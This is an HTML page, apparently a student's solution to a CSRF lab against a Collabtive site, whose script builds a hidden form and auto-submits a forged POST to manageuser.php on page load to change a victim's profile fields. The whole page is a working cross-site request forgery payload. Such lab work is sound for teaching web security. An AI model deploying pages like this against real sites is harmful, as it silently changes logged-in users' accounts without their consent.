<html>
<body>
<h1>
This page forges an HTTP POST request.
</h1>
<script>
function post(url,fields)
{
	//create a <form> element.
	var p = document.createElement('form');
	//construct the form
	p.action = url;
	p.innerHTML = fields;
	p.target = 'self';
	p.method = 'post';
	//append the form to the current page.
	document.body.appendChild(p);
	//submit the form
	p.submit();
}

function csrf_hack()
{
	var fields;
	// forms editted to asg specs
	fields += "<input type='hidden' name='name' value=’peter’>";
	fields += "<input type='hidden' name='userfile' value='badguy'>";
	fields += "<input type='hidden' name='address1' value='cmps122'>";
	post('http://www.csrflabcollabtive.com/manageuser.php?action=edit',fields);
}

// invoke csrf_hack() after the page is loaded.
window.onload = function() { csrf_hack(); }

</script></body>
</html>

